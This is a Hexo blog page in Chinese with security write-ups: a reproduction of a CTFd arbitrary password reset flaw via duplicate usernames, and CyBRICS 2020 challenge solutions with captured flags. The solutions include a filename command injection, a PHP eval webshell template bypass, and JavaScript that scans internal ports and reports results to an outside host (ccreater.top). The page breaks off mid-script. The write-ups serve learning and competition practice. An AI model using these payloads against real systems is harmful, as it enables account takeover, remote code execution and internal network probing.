<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/6/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-CTFd任意密码重置复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/CTFd%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/CTFd%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E5%A4%8D%E7%8E%B0/">CTFd任意密码重置复现</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="CTFd任意密码重置复现"><a href="#CTFd任意密码重置复现" class="headerlink" title="CTFd任意密码重置复现"></a>CTFd任意密码重置复现</h1><p>今天刚好做到一题CTFd的就顺便复现下</p>
<p>这是补丁的信息:<code>Strip spaces on registration and refine password reset</code></p>
<p>根据补丁信息去找register的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line">    errors = get_errors()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        name = request.form[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">        email_address = request.form[<span class="string">&quot;email&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line"></span><br><span class="line">        name_len = <span class="built_in">len</span>(name) == <span class="number">0</span></span><br><span class="line">        names = Users.query.add_columns(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;id&quot;</span>).filter_by(name=name).first()</span><br><span class="line">        emails = (</span><br><span class="line">            Users.query.add_columns(<span class="string">&quot;email&quot;</span>, <span class="string">&quot;id&quot;</span>)</span><br><span class="line">            .filter_by(email=email_address)</span><br><span class="line">            .first()</span><br><span class="line">        )</span><br><span class="line">        pass_short = <span class="built_in">len</span>(password.strip()) == <span class="number">0</span></span><br><span class="line">        pass_long = <span class="built_in">len</span>(password) &gt; <span class="number">128</span></span><br><span class="line">        valid_email = validators.validate_email(request.form[<span class="string">&quot;email&quot;</span>])</span><br><span class="line">        team_name_email_check = validators.validate_email(name)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> valid_email:</span><br><span class="line">            errors.append(<span class="string">&quot;Please enter a valid email address&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> email.check_email_is_whitelisted(email_address) <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">            errors.append(</span><br><span class="line">                <span class="string">&quot;Only email addresses under &#123;domains&#125; may register&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                    domains=get_config(<span class="string">&quot;domain_whitelist&quot;</span>)</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">if</span> names:</span><br><span class="line">            errors.append(<span class="string">&quot;That user name is already taken&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> team_name_email_check <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">            errors.append(<span class="string">&quot;Your user name cannot be an email address&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> emails:</span><br><span class="line">            errors.append(<span class="string">&quot;That email has already been used&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> pass_short:</span><br><span class="line">            errors.append(<span class="string">&quot;Pick a longer password&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> pass_long:</span><br><span class="line">            errors.append(<span class="string">&quot;Pick a shorter password&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> name_len:</span><br><span class="line">            errors.append(<span class="string">&quot;Pick a longer user name&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(errors) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(</span><br><span class="line">                <span class="string">&quot;register.html&quot;</span>,</span><br><span class="line">                errors=errors,</span><br><span class="line">                name=request.form[<span class="string">&quot;name&quot;</span>],</span><br><span class="line">                email=request.form[<span class="string">&quot;email&quot;</span>],</span><br><span class="line">                password=request.form[<span class="string">&quot;password&quot;</span>],</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">with</span> app.app_context():</span><br><span class="line">                user = Users(</span><br><span class="line">                    name=name.strip(),</span><br><span class="line">                    email=email_address.lower(),</span><br><span class="line">                    password=password.strip(),</span><br><span class="line">                )</span><br><span class="line">                db.session.add(user)</span><br><span class="line">                db.session.commit()</span><br><span class="line">                db.session.flush()</span><br><span class="line"></span><br><span class="line">                login_user(user)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> config.can_send_mail() <span class="keyword">and</span> get_config(</span><br><span class="line">                    <span class="string">&quot;verify_emails&quot;</span></span><br><span class="line">                ):  <span class="comment"># Confirming users is enabled and we can send email.</span></span><br><span class="line">                    log(</span><br><span class="line">                        <span class="string">&quot;registrations&quot;</span>,</span><br><span class="line">                        <span class="built_in">format</span>=<span class="string">&quot;[&#123;date&#125;] &#123;ip&#125; - &#123;name&#125; registered (UNCONFIRMED) with &#123;email&#125;&quot;</span>,</span><br><span class="line">                    )</span><br><span class="line">                    email.verify_email_address(user.email)</span><br><span class="line">                    db.session.close()</span><br><span class="line">                    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;auth.confirm&quot;</span>))</span><br><span class="line">                <span class="keyword">else</span>:  <span class="comment"># Don&#x27;t care about confirming users</span></span><br><span class="line">                    <span class="keyword">if</span> (</span><br><span class="line">                        config.can_send_mail()</span><br><span class="line">                    ):  <span class="comment"># We want to notify the user that they have registered.</span></span><br><span class="line">                        email.sendmail(</span><br><span class="line">                            request.form[<span class="string">&quot;email&quot;</span>],</span><br><span class="line">                            <span class="string">&quot;You&#x27;ve successfully registered for &#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                                get_config(<span class="string">&quot;ctf_name&quot;</span>)</span><br><span class="line">                            ),</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">        log(<span class="string">&quot;registrations&quot;</span>, <span class="string">&quot;[&#123;date&#125;] &#123;ip&#125; - &#123;name&#125; registered with &#123;email&#125;&quot;</span>)</span><br><span class="line">        db.session.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> is_teams_mode():</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;teams.private&quot;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;challenges.listing&quot;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>, errors=errors)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>阅读代码发现,查询用户名是否重复是直接将我们的输入拿去查询</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">name = request.form[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">      email_address = request.form[<span class="string">&quot;email&quot;</span>]</span><br><span class="line">      password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line"></span><br><span class="line">      name_len = <span class="built_in">len</span>(name) == <span class="number">0</span></span><br><span class="line">      names = Users.query.add_columns(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;id&quot;</span>).filter_by(name=name).first()<span class="comment">#这里这里</span></span><br><span class="line">      emails = (</span><br><span class="line">          Users.query.add_columns(<span class="string">&quot;email&quot;</span>, <span class="string">&quot;id&quot;</span>)</span><br><span class="line">          .filter_by(email=email_address)</span><br><span class="line">          .first()</span><br><span class="line">      )</span><br><span class="line">      <span class="keyword">if</span> names:</span><br><span class="line">          errors.append(<span class="string">&quot;That user name is already taken&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>而验证没有重复后,则将我们输入的用户名strip后,在添加到数据库,也就是说我们可以在数据库弄多个同名账号</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">user = Users(</span><br><span class="line">                 name=name.strip(),</span><br><span class="line">                 email=email_address.lower(),</span><br><span class="line">                 password=password.strip(),</span><br><span class="line">             )</span><br></pre></td></tr></table></figure>



<p>CTFd重置密码会收到这样的email</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Did you initiate a password reset? Click the following link to reset your password:</span><br><span class="line"></span><br><span class="line">http://f04e02df-7759-45ba-a2b2-b89399e91ca0.node3.buuoj.cn/reset_password/ImFkbWluIg.XoRn7w.CDy8yi95cLlHsZN_YRiCp9Z-mX4</span><br></pre></td></tr></table></figure>

<p>我们去找<code>/reset_password/&lt;xxx&gt;</code>的路由</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@auth.route(<span class="params"><span class="string">&quot;/reset_password&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@auth.route(<span class="params"><span class="string">&quot;/reset_password/&lt;data&gt;&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@ratelimit(<span class="params">method=<span class="string">&quot;POST&quot;</span>, limit=<span class="number">10</span>, interval=<span class="number">60</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_password</span>(<span class="params">data=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            name = unserialize(data, max_age=<span class="number">1800</span>)</span><br><span class="line">        <span class="keyword">except</span> (BadTimeSignature, SignatureExpired):</span><br><span class="line">            <span class="keyword">return</span> render_template(</span><br><span class="line">                <span class="string">&quot;reset_password.html&quot;</span>, errors=[<span class="string">&quot;Your link has expired&quot;</span>]</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">except</span> (BadSignature, TypeError, base64.binascii.Error):</span><br><span class="line">            <span class="keyword">return</span> render_template(</span><br><span class="line">                <span class="string">&quot;reset_password.html&quot;</span>, errors=[<span class="string">&quot;Your reset token is invalid&quot;</span>]</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;reset_password.html&quot;</span>, mode=<span class="string">&quot;set&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">            user = Users.query.filter_by(name=name).first_or_404()</span><br><span class="line">            user.password = request.form[<span class="string">&quot;password&quot;</span>].strip()</span><br><span class="line">            db.session.commit()</span><br><span class="line">            log(</span><br><span class="line">                <span class="string">&quot;logins&quot;</span>,</span><br><span class="line">                <span class="built_in">format</span>=<span class="string">&quot;[&#123;date&#125;] &#123;ip&#125; -  successful password reset for &#123;name&#125;&quot;</span>,</span><br><span class="line">                name=name,</span><br><span class="line">            )</span><br><span class="line">            db.session.close()</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;auth.login&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>我们发现,重置密码是根据用户名查出的第一个记录进行修改<code>user = Users.query.filter_by(name=name).first_or_404()</code></p>
<p>这样我们就成功覆盖了之前真实用户的密码而不是我们创建的用户</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/CTFd%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E5%A4%8D%E7%8E%B0/" data-id="cku8j3fg90019dan733jeayz8" data-title="CTFd任意密码重置复现" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CyBRICS2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/CyBRICS2020/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/CyBRICS2020/">CyBRICS2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="CyBRICS-2020"><a href="#CyBRICS-2020" class="headerlink" title="CyBRICS  2020"></a>CyBRICS  2020</h1><h2 id="Hunt"><a href="#Hunt" class="headerlink" title="Hunt"></a>Hunt</h2><p>用burp修改返回包</p>
<p>flag:<code>cybrics&#123;Th0se_c4p7ch4s_c4n_hunter2_my_hunter2ing_hunter2&#125;</code></p>
<h2 id="Gif2png"><a href="#Gif2png" class="headerlink" title="Gif2png"></a>Gif2png</h2><p>源代码已上传</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if not bool(re.match(&quot;^[a-zA-Z0-9_\-. &#x27;\&quot;\=\$\(\)\|]*$&quot;, file.filename)):</span><br><span class="line">    exit()</span><br><span class="line">...</span><br><span class="line">def allowed_file(filename):</span><br><span class="line">    return &#x27;.&#x27; in filename and filename.rsplit(&#x27;.&#x27;, 1)[1].lower() in ALLOWED_EXTENSIONS</span><br><span class="line">allowed_file(file.filename)</span><br><span class="line">...</span><br><span class="line">command = subprocess.Popen(f&quot;ffmpeg -i &#x27;uploads/&#123;file.filename&#125;&#x27; \&quot;uploads/&#123;uid&#125;/%03d.png\&quot;&quot;, shell=True)</span><br></pre></td></tr></table></figure>

<p><code>filename=&quot;&#39;$(sleep 5)&#39;a.gif&quot;</code>来执行命令</p>
<p>cybrics{imagesaresocoolicandrawonthem}</p>
<h2 id="woc"><a href="#woc" class="headerlink" title="woc"></a>woc</h2><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200726002857.png" alt="image631"></p>
<p>calc.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;#(?=^([ %()*+\-./]+|\d+|M_PI|M_E|log|rand|sqrt|a?(sin|cos|tan)h?)+$)^([^()]*|([^()]*\((?&gt;[^()]+|(?4))*\)[^()]*)*)$#s&#x27;</span>, <span class="variable">$field</span>)) &#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="string">&quot;BAD&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$value</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$field</span>;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">9999999999999999999:1.0E+25</span><br><span class="line">1/0:INF</span><br><span class="line">0/0:NAN</span><br><span class="line">log(0):-INF</span><br></pre></td></tr></table></figure>


<p>newtemplate.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strpos(<span class="variable">$html</span>, <span class="string">&#x27;&lt;?&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="variable">$error</span> = <span class="string">&quot;Bad chars&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">file_put_contents(<span class="string">&quot;calcs/<span class="subst">$userid</span>/templates/<span class="subst">$uuid</span>.html&quot;</span>, <span class="variable">$html</span>);</span><br></pre></td></tr></table></figure>

<p>calc.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="string">&quot;calcs/<span class="subst">$userid</span>/<span class="subst">$calc</span>.php&quot;</span>, <span class="string">&quot;&lt;script&gt;var preloadValue = &lt;?=json_encode((string)(<span class="subst">$field</span>))?&gt;;&lt;/script&gt;\n&quot;</span> . file_get_contents(<span class="string">&quot;inc/calclib.html&quot;</span>) . file_get_contents(<span class="string">&quot;calcs/<span class="subst">$userid</span>/templates/<span class="subst">$template</span>.html&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>html转php处，利用<code>/*</code>破坏结构，<code>file_get_contents(&quot;calcs/$userid/templates/$template.html&quot;))</code>处<code>*/</code>收尾，于是绕过成功</p>
<p>新建template:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">*/)).eval($_POST[1])?&gt;</span><br><span class="line">$requiredBlocks = [</span><br><span class="line">            &#x27;id=&quot;back&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;field&quot; name=&quot;field&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit0&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit1&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit2&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit3&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit4&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit5&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit6&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit7&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit8&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit9&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;plus&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;equals&quot;&#x27;,</span><br><span class="line">        ];</span><br></pre></td></tr></table></figure>

<p>向calc post:<br><code>field=1/*&amp;share=1</code></p>
<p>flag:cybrics{5aMe_7h1ng_W3_d0_3Ve5y_n16ht_P1nKY.Try_2_t4k3_0vEr_t3h_w0RLd}</p>
<h2 id="Developer’s-Laptop"><a href="#Developer’s-Laptop" class="headerlink" title="Developer’s Laptop"></a>Developer’s Laptop</h2><p>看题目样子是xss题?SSRF?</p>
<p>浏览器信息：HeadlessChrome/79.0.3945.79 </p>
<p>填写脚本：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="built_in">document</span>.getElementsByClassName(<span class="string">&quot;form-control&quot;</span>);a[<span class="number">1</span>].value=<span class="string">&quot;WQLSaidXUtQAfD6ptJc7Yg&quot;</span>;a[<span class="number">0</span>].value=<span class="string">&quot;http://ccreater.top:60000&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>返回包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HEAD / HTTP/1.1</span><br><span class="line">Host: ccreater.top:60000</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.79 Safari/537.36</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Access-Control-Request-Method: POST</span><br><span class="line">Origin: prod.free-design-feedback-cybrics2020.ctf.su</span><br><span class="line">Referer: http://prod.free-design-feedback-cybrics2020.ctf.su</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>等等开发人员的电脑？肯定一堆服务，内网扫描！</p>
<p>http服务扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    </span><br><span class="line">&lt;script&gt;</span><br><span class="line">var from = 1;</span><br><span class="line">var complete = true;</span><br><span class="line">var clear = false;</span><br><span class="line">function check(text)&#123;</span><br><span class="line">    var linkEl = document.head.querySelector(&#x27;link[href*=&quot;&#x27;+text+&#x27;&quot;&#x27;);</span><br><span class="line">    var cssLoaded = Boolean(linkEl.sheet);</span><br><span class="line">    linkEl.addEventListener(&#x27;load&#x27;, function () &#123;</span><br><span class="line">        console.log(text)</span><br><span class="line">        // log</span><br><span class="line">		fetch(&quot;http://ccreater.top:60010/log.php?log=&quot;+text)</span><br><span class="line">			.then(r=&gt;r.text())</span><br><span class="line">			.then(d=&gt;&#123;console.log(&quot;log success&quot;)&#125;)</span><br><span class="line">		// log end</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">function clearstyle(clear_from ,clear_to)&#123;</span><br><span class="line">	clear = true;</span><br><span class="line">	console.log(&quot;clear task start&quot;);</span><br><span class="line">	while(clear_to&lt;=clear_from)&#123;</span><br><span class="line">            document.head.querySelector(&#x27;link[href$=&quot;:&#x27;+clear_to+&#x27;&quot;&#x27;).remove();</span><br><span class="line">			clear_to++;</span><br><span class="line">    &#125;</span><br><span class="line">	clear = false;</span><br><span class="line">	console.log(&quot;clear task end&quot;);</span><br><span class="line">&#125;</span><br><span class="line">function make(text)&#123;</span><br><span class="line">    head = document.getElementsByTagName(&#x27;head&#x27;)[0];</span><br><span class="line">	var port = text;</span><br><span class="line">    var url = &quot;http://127.0.0.1:&quot;+port,</span><br><span class="line">    link = document.createElement(&#x27;link&#x27;);</span><br><span class="line">    link.rel = &quot;stylesheet&quot;;</span><br><span class="line">    link.href = url;</span><br><span class="line">    head.appendChild(link);</span><br><span class="line">    